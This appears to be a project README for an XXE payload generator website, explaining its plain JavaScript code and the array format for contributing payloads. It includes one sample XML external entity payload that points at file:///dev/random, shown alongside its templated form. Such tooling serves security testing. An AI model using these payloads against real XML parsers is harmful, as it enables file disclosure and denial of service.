**Go here to see it in action**: [https://xxe.warder.io/](https://xxe.warder.io/).

# Code

The source code is uncomplicated JavaScript, HTML and CSS code.

In my opinion, the usage of massive front-end frameworks would be a waste of resources here.

## Contribute Payloads

The payload is an array of strings, each of which is a substring of the payload formed by splitting it on boundaries formed by the new line character.

An example:
```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM  "file:///dev/random" >]>
<foo>&xxe;</foo>
```

would be transformed to

```javascript
['<?xml version="1.0" encoding="ISO-8859-1"?>','<!DOCTYPE foo [','  <!ELEMENT foo ANY >','  <!ENTITY xxe SYSTEM "{{URL}}" >]>','<foo>&xxe;</foo>'],
```

Note that the URI `file:///dev/random` is replaced with the placeholder `{{URL}}`.
